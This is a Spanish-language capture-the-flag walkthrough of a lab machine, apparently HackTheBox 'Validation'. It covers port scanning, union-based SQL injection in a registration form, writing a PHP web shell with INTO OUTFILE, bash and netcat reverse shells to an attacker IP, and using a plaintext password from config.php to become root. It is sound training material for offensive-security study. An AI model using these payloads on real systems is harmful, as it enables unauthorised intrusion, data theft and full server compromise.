1. Escaneo con nmap

```console
└─$ nmap -sCV -Pn -T5 10.10.11.116

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

└─$ whatweb http://10.10.11.116:80
http://10.10.11.116:80 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Ap
ache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]

└─$ whatweb http://10.10.11.116:8080
http://10.10.11.116:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[502 Bad Gateway], nginx
```
2. La web en el puerto 80 -> Es una web php por lo que dice el escaneo. Te da un formulario con el nombre y un pais -> Pongo "cucuxii:Canada" y 
me dirige a /account.php donde sale una lista (vacia) de otros jugadores en esa zona.

Se me ocurrieron tanto un STTI (por estar reflejado mi input (nombre)) como un sqli, ya que intuyo que la query puede ser algo como esto -
```SELECT player FROM players WHERE country='Canada';```

La peticion se tramita tal que asi "POST a / -> 'username=cucuxii&country=Canada' -> redirect a /account.php" donde me setea una cookie como 
"1a5bf49db4c2f7f4cf8f1645e1fd3cc5" (no parece base64 ni hexadecimal...)

Intente formar un error sqli como "Canada'" y salio un error como este ```Fatal error: Uncaught Error: Call to a member function fetch_assoc() on 
bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33``` Investigue de que se trataba este err
or y sale porque se ha puesto mal una query sql. Si ponemos "' -- -" ya no sale porque se ha cerrado 

3. SQLI:
```' union select 1-- -``` devuelve 1 en la respuesa, o sea ya tenemos campo que explotar.
```' union select database()-- - # -> registration```
```' union select schema_name from information_schema.schemata-- -   # -> mysql registration```
```' union select table_name from information_schema.tables where table_schema = 'registration'-- -```
```' union select column_name from information_schema.columns where table_schema = 'registration' and table_name ='registration'-- - # -> username userhash```
```' union select group_concat(username,0x3a,userhash) from registration-- -```
Aun asi esta ultima query solo me devolvia los hashes de mis usuarios que he ido creando.

4. Shell
```' union select "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -```
Me ha dado el error, pero luego la ruta existir existia diciendo que no puedo dar un comando en blanco.

He hecho una peticion tal que asi y me ha dado una shell como www-data:
```
http://10.10.11.116/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'
http://10.10.11.116/shell.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.8 443 >/tmp/f
```

```
└─$ sudo nc -nlvp 443
www-data@validation:/var/www/html$ ls  # -> config.php
www-data@validation:/var/www/html$ cat config.php # ->   $password = "uhc-9qual-global-pw";
www-data@validation:/var/www/html$ su root # -> Password: uhc-9qual-global-pw
```


